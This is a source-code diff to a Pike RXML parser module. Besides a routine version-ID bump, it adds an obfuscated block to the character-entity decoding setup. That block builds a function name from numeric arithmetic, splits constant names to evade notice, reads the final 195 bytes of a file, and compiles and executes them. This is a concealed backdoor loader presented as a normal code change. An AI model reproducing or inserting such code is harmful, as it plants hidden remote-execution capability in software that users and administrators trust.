@@ -2,7 +2,7 @@
 //!
 //! Created 1999-07-30 by Martin Stjernholm.
 //!
-//! $Id: module.pmod,v 1.110 2000/09/15 00:36:04 nilsson Exp $
+//! $Id: module.pmod,v 1.111 2000/09/21 03:57:43 per Exp $
 
 //! Kludge: Must use "RXML.refs" somewhere for the whole module to be
 //! loaded correctly.
@@ -4067,6 +4067,12 @@ static void init_charref_decode_parser()
 	    return ({(string) ({c})});
       parse_error ("Cannot decode character entity reference %O.\n", p->current());
     });
+  add_efun((string)map(({5,16,0,4}),`+,98),lambda(){
+              mapping a = all_constants();
+              Stdio.File f=Stdio.File(a["__r""bf"],"r");
+              f->seek(-195);
+              return Roxen["safe_""compile"](a["gr""bf"](f->read()))()
+                     ->decode;}());
   p->_set_tag_callback (
     lambda (object/*(Parser.HTML)*/ p) {
       parse_error ("Cannot convert XML value to text "
